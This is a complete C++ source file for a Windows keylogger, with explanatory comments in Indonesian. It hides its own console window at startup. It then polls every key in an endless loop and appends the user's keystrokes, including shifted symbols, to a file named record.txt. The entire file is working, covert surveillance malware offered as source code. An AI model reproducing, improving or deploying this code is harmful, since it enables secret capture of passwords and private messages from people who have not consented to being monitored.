#include <iostream> //librari utama untuk input dan output.
#include <windows.h> //header untuk mengakses fungsionalitas di OS Windows.
#include <fstream> //librari untuk menulis output ke file.

using namespace std;

void log(); //prototype fungsi log
void hide(); //prototipe fungsi hide

int main() { //fungsi utama
    hide();
    log();
    return 0;
}

void log(){ //fungsi keylogger.

    char key;

    while (true){ //endless loop --keylogger berjalan terus.

        for (key = 8; key <= 127; key++){ //
            if (GetAsyncKeyState(key) == -32767){ //jika keyboard ditekan
                ofstream  write ("record.txt", ios::app); //ios::app --menulis output di akhir baris.

                if (((key > 64) && (key < 91)) && !(GetAsyncKeyState(VK_SHIFT))) { //jika menekan huruf tanpa shift
                    key += 32; //ubah menjadi huruf kecil (sesuai dengan urutan ASCII)
                    write << key; //tulis output ke file
                    write.close(); //menutup stream file
                    break;

                } else if ((key > 64) && (key < 91)){ //jika menekan huruf dan shift
                    write << key;
                    write.close();
                    break;

                } else {
                    switch (key) {

                        case VK_CAPITAL: //jika CAPSLOCK ON
                            write << "<CAP>";
                            break;

                        case VK_TAB: //jika menekan TAB
                            write << "<tab>";
                            break;

                        case VK_BACK: //jika menekan BACKSPACE
                            write << "<-";
                            break;

                        case VK_RETURN: //jika menekan ENTER
                            write << endl;
                            break;

                        case VK_SPACE: //jika menekan SPASI
                            write << " ";
                            break;

                        case 48: //jika menekan angka 0
                            if (GetAsyncKeyState(0x10)){ //dan juga menekan shift
                                write << ")"; //tulis karakter ")"

                            } else { //jika tidak menekan shift
                                write << key; //tulis angka saja
                            }
                            break;

                        case 49: //jika menekan angka 1
                            if (GetAsyncKeyState(0x10)){
                                write << "!";

                            } else {
                                write << key;
                            }
                            break;

                        case 50: //jika menekan angka 2
                            if (GetAsyncKeyState(0x10)){
                                write << "@";

                            } else {
                                write << key;
                            }
                            break;

                        case 51: //jika menekan angka 3
                            if (GetAsyncKeyState(0x10)){
                                write << "#";

                            } else {
                                write << key;
                            }
                            break;

                        case 52: //jika menekan angka 4
                            if (GetAsyncKeyState(0x10)){
                                write << "$";

                            } else {
                                write << key;
                            }
                            break;

                        case 53: //jika menekan angka 5
                            if (GetAsyncKeyState(0x10)){
                                write << "%";

                            } else {
                                write << key;
                            }
                            break;

                        case 54: //jika menekan angka 6
                            if (GetAsyncKeyState(0x10)){
                                write << "^";

                            } else {
                                write << key;
                            }
                            break;

                        case 55: //jika menekan angka 7
                            if (GetAsyncKeyState(0x10)){
                                write << "&";

                            } else {
                                write << key;
                            }
                            break;

                        case 56: //jika menekan angka 8
                            if (GetAsyncKeyState(0x10)){
                                write << "*";

                            } else {
                                write << key;
                            }
                            break;

                        case 57: //jika menekan angka 9
                            if (GetAsyncKeyState(0x10)){
                                write << "(";

                            } else {
                                write << key;
                            }
                            break;

                    }
                }
            }
        }
    }
}

void hide(){
    HWND handle; //membuat windows handle
    AllocConsole();
    handle = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(handle, 0); //0 = menyembunyikan window;
}